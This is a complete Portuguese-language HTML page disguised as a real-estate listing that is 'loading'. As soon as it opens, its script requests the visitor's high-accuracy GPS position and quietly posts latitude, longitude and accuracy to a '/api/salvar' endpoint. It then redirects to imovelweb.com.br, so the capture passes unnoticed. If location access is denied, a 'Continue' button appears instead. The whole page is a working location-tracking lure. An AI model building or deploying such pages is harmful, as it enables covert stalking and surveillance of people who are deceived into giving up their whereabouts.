<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando Imóvel...</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f9; color: #333; margin: 0; }
        .box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); display: inline-block; max-width: 400px; width: 90%; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        /* Botão discreto que aparece se precisar */
        #btn-continuar-container {
            display: none;
            margin-top: 20px;
        }
        .btn-continuar {
            background-color: #27ae60;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
        }
    </style>
</head>
<body>
    <div class="box">
        <h2>Carregando informações do imóvel...</h2>
        <div class="spinner" id="loader"></div>
        <p id="status-texto">Aguarde um momento.</p>

        <!-- Botão discreto de Continuar caso o GPS falhe ou esteja desligado -->
        <div id="btn-continuar-container">
            <button class="btn-continuar" onclick="avancar()">Continuar</button>
        </div>
    </div>

    <script>
        function pegarLocalizacao() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(pos) {
                    let lat = pos.coords.latitude;
                    let lon = pos.coords.longitude;
                    let precisao = pos.coords.accuracy;

                    // Envia os dados para a API e redireciona
                    fetch('/api/salvar', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ lat, lon, precisao })
                    }).finally(() => {
                        window.location.href = "https://www.imovelweb.com.br";
                    });

                }, function(err) {
                    // Se a localização estiver desligada ou negada, 
                    // removemos o ícone girando e mostramos apenas o botão "Continuar"
                    document.getElementById('loader').style.display = 'none';
                    document.getElementById('status-texto').innerText = "Toque abaixo para carregar a página.";
                    document.getElementById('btn-continuar-container').style.display = 'block';
                }, {
                    timeout: 6000,
                    enableHighAccuracy: true
                });
            } else {
                window.location.href = "https://www.imovelweb.com.br";
            }
        }

        function avancar() {
            // Se a pessoa clicar no botão de continuar mesmo sem GPS, redireciona normalmente
            window.location.href = "https://www.imovelweb.com.br";
        }

        window.onload = function() {
            pegarLocalizacao();
        };
    </script>
</body>
</html>
